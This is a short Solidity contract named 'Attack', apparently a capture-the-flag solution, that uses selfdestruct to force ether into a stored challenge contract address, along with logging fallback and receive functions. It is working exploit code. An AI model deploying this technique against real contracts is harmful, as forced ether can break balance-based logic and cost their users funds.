// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
 contract Attack {
    event Log(string message);
    address attackAddress;

    constructor(address _attAddress){
        attackAddress= _attAddress;

    }

    function attack() public {
        address payable challContractAddress= payable(attackAddress);
        selfdestruct(challContractAddress);
    }

    fallback() external payable {
        emit Log("Fallback function called");
    }
    receive() external payable {
        emit Log("Receive function called");
    }
 }